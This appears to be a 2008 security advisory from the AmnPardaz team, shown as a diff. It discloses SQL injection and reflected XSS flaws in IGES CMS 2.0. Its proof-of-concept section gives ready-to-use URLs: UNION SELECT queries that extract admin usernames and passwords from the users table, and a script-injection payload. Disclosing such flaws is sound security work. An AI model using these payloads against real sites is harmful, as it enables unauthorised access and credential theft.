@@ -1,0 +1,62 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: IGES CMS <=2.0 Multiple Vulnerabilities
+# Vendor: www.iges.nl
+# Exploit: Available
+# Vulnerable Version: 2.0
+# Impact: High
+# Fix: N/A
+###################################################################################
+
+####################
+1. Description:
+####################
+
+    IGES CMS is a complete, fully featured CMS in PHP language with SQL and became a powerful CMS having plenty of strong modules.
+    This CMS is not open-source and is accessible for private use by the author company for designing their customer's websites.
+
+####################
+2. Vulnerabilities:
+####################
+
+    2.1. Injection Flaws. SQL Injection in "/news.php" or "/news_body.php" in "news_id" parameter.
+        2.1.1. Exploit:
+                        Check the exploit/POC section.
+    2.2. Cross Site Scripting (XSS). Reflected XSS attack in "/links.php" in "cat" parameter.
+        2.2.1. Exploit:
+                        Check the exploit/POC section.
+
+####################
+3. Exploits/POCs:
+####################
+
+1. Exploits/POCs:
+	1.1. Injection Flaws. SQL Injection in "/news.php" or "/news_body.php" in "news_id" parameter.
+		-------------
+		Find Admin's password:
+		http://[URL]/news.php?news_id=65 union select 1,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12 from users/*
+		http://[URL]/news_body.php?news_id=65 union select 1,2,3,4,5,concat(username,0x3a,password),7,8,9,10,11,12 from users/*
+		-------------
+		1.2. Cross Site Scripting (XSS). Reflected XSS attack in "/links.php" in "cat" parameter.
+		-------------
+		http://[URL]/links.php?cat=<script>alert(/XSS/.source)</script>
+		-------------
+
+####################
+4. Solution:
+####################
+
+    Edit the source code to ensure that inputs are properly sanitized.
+
+####################
+5. Credit:
+####################
+
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-08-05]
